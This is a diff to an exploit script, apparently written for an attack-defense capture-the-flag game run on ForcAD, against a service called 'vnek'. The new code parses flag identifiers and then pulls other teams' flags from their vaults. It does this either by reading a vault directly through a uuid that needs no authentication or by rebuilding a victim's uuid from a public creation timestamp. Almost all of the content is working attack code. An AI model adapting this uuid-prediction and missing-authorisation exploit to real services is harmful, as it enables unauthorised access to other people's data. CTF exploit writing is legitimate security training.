@@ -43,6 +43,7 @@ Deps: requests (stdlib base64/re/uuid otherwise).
 """
 import calendar
 import random
+import json
 import re
 import string
 import sys
@@ -256,18 +257,44 @@ def _target_vault(s, base, node, cs, victim_uuid=None, created=None, span=4):
     return flags
 
 
+def _flag_id_target(fid):
+    """Normalize a flag_id to ('uuid', v) | ('username', v) | (None, None).
+    ForcAD hands vnek flag_id as a JSON string like {"username": "abc"} (seen
+    live), but it may also be a bare username or a bare uuid — handle all."""
+    if not fid:
+        return None, None
+    s = fid.strip()
+    if s[:1] in "{[":
+        try:
+            j = json.loads(s)
+        except ValueError:
+            j = None
+        if isinstance(j, dict):
+            for k in ("uuid", "id", "user_id", "userId"):
+                val = j.get(k)
+                if isinstance(val, str) and _UUID_RE.match(val):
+                    return "uuid", val
+            for k in ("username", "user", "name", "login"):
+                val = j.get(k)
+                if isinstance(val, str) and val:
+                    return "username", val
+    if _UUID_RE.match(s):
+        return "uuid", s
+    return "username", s
+
+
 def exploit(host, port, flag_id):
     flags, seen = [], set()
     try:
         base = "http://%s:%s" % (host, port)       # %s: a bad port returns [] instead of raising
-        fid = None if flag_id is None else str(flag_id).strip()
+        kind, val = _flag_id_target(None if flag_id is None else str(flag_id))
 
-        # Fast path: flag_id already a uuid -> one vault read, no reconstruction.
-        if fid and _UUID_RE.match(fid):
+        # Fast path: flag_id resolves to a uuid -> one vault read, no reconstruction.
+        if kind == "uuid":
             s, _node, _cs = _session(base)
             if s is None:
                 s = requests.Session()             # vuln build needs no auth; try anyway
-            for f in _read_vault(s, base, fid):
+            for f in _read_vault(s, base, val):
                 if f not in seen:
                     seen.add(f); flags.append(f)
             return flags
@@ -280,9 +307,9 @@ def exploit(host, port, flag_id):
             if s is None:
                 return flags
 
-        if fid:
-            # flag_id is a username: resolve its public `created`, reconstruct, read.
-            created = _created_for_username(s, base, fid)
+        if kind == "username":
+            # resolve the victim's public `created`, reconstruct the uuid, read.
+            created = _created_for_username(s, base, val)
             if created:
                 for f in _target_vault(s, base, node, cs, created=created, span=4):
                     if f not in seen:
